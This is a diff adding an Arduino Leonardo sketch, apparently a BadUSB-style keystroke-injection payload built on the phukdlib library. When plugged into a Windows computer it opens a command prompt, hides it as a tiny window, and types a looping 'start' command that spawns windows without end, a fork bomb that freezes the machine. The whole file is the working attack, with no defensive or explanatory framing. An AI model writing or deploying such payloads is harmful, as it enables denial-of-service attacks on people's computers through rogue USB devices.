@@ -1,0 +1,18 @@
+#include <phukdlib_leonardo.h>
+#define kbd_es_es
+
+void setup() {
+  Keyboard.begin();
+}
+
+void loop() {
+  delay(5000);
+  CommandAtRunBarMSWIN("cmd");
+  delay(3000);
+  Keyboard.println("MODE CON: COLS=15 LINES=1");
+  delay(2000);
+  Keyboard.println("COLOR EF");
+  delay(2000);
+  Keyboard.println("for /l %x in (1,1,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) do start");
+  while(1);
+}
